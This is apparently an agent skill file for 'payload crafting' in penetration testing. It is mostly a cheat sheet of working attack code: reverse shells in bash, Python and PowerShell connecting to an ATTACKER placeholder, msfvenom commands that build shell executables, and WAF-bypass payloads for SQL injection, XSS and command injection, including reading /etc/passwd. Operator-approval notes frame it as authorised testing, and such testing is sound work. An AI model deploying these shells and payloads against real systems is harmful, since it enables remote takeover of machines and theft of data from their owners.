---
name: payload-crafting
description: >-
  Use this skill for crafting custom exploitation payloads. Covers shell
  generation, encoding/obfuscation, WAF bypass techniques, payload
  delivery mechanisms, and custom exploit development. Activate when
  standard tools fail and custom payloads are needed for confirmed
  vulnerabilities.
---

# Payload Crafting & Custom Exploitation

Create targeted payloads for confirmed vulnerabilities.

## ⚠️ PREREQUISITE: Operator approval required. Only craft payloads for confirmed, approved findings.

## Shell Generation

### Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"

# msfvenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=PORT -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=PORT -f exe -o shell.exe
```

## WAF Bypass Techniques

### SQL Injection
```
# Case variation
SeLeCt, uNiOn

# Comment injection
SEL/**/ECT, UN/**/ION

# Encoding
%53%45%4c%45%43%54 (URL encoding)
char(83,69,76,69,67,84) (char encoding)

# Alternative syntax
1' || '1'='1
1' && '1'='1
```

### XSS
```html
<!-- Event handlers -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>

<!-- Encoding -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- DOM-based -->
javascript:alert(1)
```

### Command Injection
```bash
# Separator bypass
;id
|id
`id`
$(id)
%0aid

# Quote bypass
/bin/c''at /etc/passwd
/bin/c\at /etc/passwd
```

## Encoding & Obfuscation

| Technique | Use Case |
|-----------|----------|
| Base64 | Bypass basic filters |
| URL encoding | Web parameter injection |
| Double URL encoding | WAF bypass |
| Unicode | Filter bypass |
| Hex encoding | SQL injection |
| HTML entities | XSS payloads |

## Payload Testing

1. **Benign test first**: Use harmless payloads (e.g., `sleep`, `ping`) before anything impactful
2. **Escalate gradually**: Start with detection, then demonstrate impact
3. **Document everything**: Log exact payload, delivery method, and response
4. **Clean up**: Remove any artifacts after testing

## ⚠️ HITL: Every payload execution requires explicit operator approval
